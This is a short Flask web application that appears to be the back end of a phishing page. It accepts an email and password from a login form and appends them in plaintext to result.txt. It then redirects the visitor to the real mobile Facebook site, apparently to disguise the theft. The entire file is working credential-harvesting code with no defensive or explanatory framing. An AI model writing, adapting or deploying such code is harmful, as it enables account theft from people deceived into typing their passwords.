from flask import Flask, request, render_template, redirect

app = Flask("Event")

@app.route("/", methods=["GET","POST"])
def login():
	if request.method == "POST":
		email = request.form["email"]
		password = request.form["pass"]
		if email.replace(" ","") == "" and password.replace(" ","") == "":
			return render_template("template_sec_all.html")
		else:
			if email.replace(" ","") == "":
				return render_template("template_sec_email.html")
			else:
				if password.replace(" ","") == "":
					return render_template("template_sec_pass.html")
				else:
					open("result.txt","a").write(f"{email}|{password}\n")
					return redirect("https://m.facebook.com", code=302)
	return render_template("template.html")
